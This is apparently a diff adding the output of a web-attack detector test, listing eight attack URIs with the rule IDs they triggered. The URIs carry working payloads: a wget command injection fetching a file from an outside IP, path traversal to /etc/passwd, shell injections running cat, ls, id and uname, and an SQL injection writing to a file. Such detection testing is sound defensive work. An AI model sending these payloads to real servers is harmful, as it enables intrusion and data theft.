@@ -1,0 +1,11 @@
+---------------------- Statistics of URIs analyzed------------------------
+[10] input, [2] clean, [8] attacks
+--------------------------- Analysis results -----------------------------
+Packet [1]	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)	PLmin [1]	Score [0]	Nattacks [5]	[932105]	[932130]	[932150]	[932160]	[949110]
+Packet [2]	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1	PLmin [1]	Score [0]	Nattacks [6]	[920270]	[930100]	[930110]	[930120]	[932160]	[949110]
+Packet [3]	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile	PLmin [1]	Score [0]	Nattacks [3]	[930100]	[930110]	[949110]
+Packet [4]	/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%3B+cat%20/etc/passwd	PLmin [1]	Score [0]	Nattacks [4]	[930120]	[932100]	[932160]	[949110]
+Packet [5]	/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%26+ls%20/etc/	PLmin [1]	Score [0]	Nattacks [2]	[932100]	[949110]
+Packet [7]	/ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F1.1.1.1_pass_tshark.pcap%27--+-%22%3B%7D	PLmin [1]	Score [0]	Nattacks [2]	[942190]	[949110]
+Packet [9]	/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo;id;uname%20-a)>%262`	PLmin [1]	Score [0]	Nattacks [3]	[932105]	[932110]	[949110]
+Packet [10]	/cgi-bin/filemanager/utilRequest.cgi?func=cancel_trash_recovery&sid=SIDVALUE&pid=`id>/tmp/pwned`	PLmin [1]	Score [0]	Nattacks [2]	[932100]	[949110]
